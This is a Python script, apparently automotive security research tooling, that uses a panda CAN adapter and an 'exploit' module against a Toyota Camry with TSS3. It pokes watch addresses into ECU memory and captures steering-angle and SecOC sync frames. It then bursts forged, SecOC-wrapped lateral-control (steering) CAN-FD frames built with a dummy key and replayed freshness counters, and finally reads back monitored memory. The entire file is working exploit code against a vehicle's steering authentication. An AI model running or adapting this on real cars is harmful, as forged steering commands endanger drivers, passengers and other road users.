import time
from exploit.ephemeral_runtime.camry_f33_runtime_monitor import MonitorSession,OP_SET_WATCH_BASE,OP_RUN,CONTROL_CAN_ID,CONTROL_CAN_BUS,command_frame,decode_secoc_sync,decode_steering_angle_deg
from opendbc.car.toyota.tss3 import *
s=MonitorSession(require_ready_parked=True)
addrs=[0xFFD23580,0xFFD2358C,0xFFD23600,0xFFD2360C,0xFFD23680,0xFFD2368C,0xFFD23610,0xFFD23604]
for i,a in enumerate(addrs): s._send(OP_SET_WATCH_BASE+i,a,lambda st,i=i,a=a: st['watch_addresses_raw'][i]==a)
for _ in range(100): s.panda.can_recv(); time.sleep(.001)
ang=s.panda.latest(0,0x025); sync=s.panda.latest(0,0x00F); assert ang and sync
raw=target_angle_deg_to_raw(decode_steering_angle_deg(ang[1])); tpl=TSS3B6Template(); comp=TSS3B6CompanionFields(signal264_b6_bits6_4=5,additive_term_suppress=0,contribution_pct_1=23,contribution_pct_2=47,signal273_b10_bits2_0=5)
r=s.set_running(True); print('start seq',r['sequence'],'gen',r['state']['sample_generation'])
seq=0;mc=0;cr=None; dl=time.monotonic(); end=time.monotonic()+.25; sent=0
while time.monotonic()<end:
    # no can_recv / UDS during burst; freshness from seeded sync, deliberately short
    sy=decode_secoc_sync(sync[1]); rr=int(sy['reset_counter'])
    if cr!=rr: cr=rr;mc=0
    app=build_b6_application(target_lateral_id=63,target_angle_raw=raw,sequence=seq,template=tpl,companions=comp)
    a,d,_=build_b6_secoc_frame(TSS3_B6_DUMMY_SECOC_KEY,app,TSS3Freshness(int(sy['trip_counter']),rr,mc))
    s.panda.can_send(a,d,0,fd=True); sent+=1;seq=(seq+1)&63;mc=(mc+1)&255
    dl+=.005; time.sleep(max(0,dl-time.monotonic()))
stopseq=(r['sequence']+1)&255; sf=command_frame(stopseq,OP_RUN,0)
print('sent',sent,'stopseq',stopseq,sf.hex())
for i in range(10): s.panda.can_send(CONTROL_CAN_ID,sf,CONTROL_CAN_BUS); time.sleep(.03)
time.sleep(.3)
st=s.read_state(); vals=[v['raw_u32'] for v in st['values']]
print('after seq',st['last_sequence'],'running',st['running'],'gen',st['sample_generation'],'ids',[hex(vals[i]&0x1fffffff) for i in (0,2,4)],'df0',[hex(vals[i]) for i in (1,3,5)],'df1',hex(vals[6]),'ptr',hex(vals[7]))
